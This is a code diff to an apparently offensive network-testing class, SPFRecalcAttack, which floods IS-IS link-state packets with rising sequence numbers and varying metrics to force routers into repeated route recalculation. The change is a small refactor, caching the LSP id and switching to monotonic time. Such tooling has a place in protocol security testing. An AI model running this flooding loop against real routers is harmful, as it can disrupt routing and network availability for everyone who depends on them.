@@ -17,14 +17,15 @@ class SPFRecalcAttack(BaseAttack):
         self._sender = PacketSender(
             iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
         )
+        self._lsp_id = f"{self.config.sys_id}.00-00"
 
     def launch(self) -> AttackResult:
         seq = 1
-        deadline = time.time() + self.config.duration
-        while time.time() < deadline:
+        deadline = time.monotonic() + self.config.duration
+        while time.monotonic() < deadline:
             pkt = build_lsp_with_tlvs(
                 sys_id=self.config.sys_id,
-                lsp_id=f"{self.config.sys_id}.00-00",
+                lsp_id=self._lsp_id,
                 src_mac=self._src_mac, level=self.config.level,
                 sequence=seq, remaining_lifetime=1200,
                 metric=seq % 100 + 1,
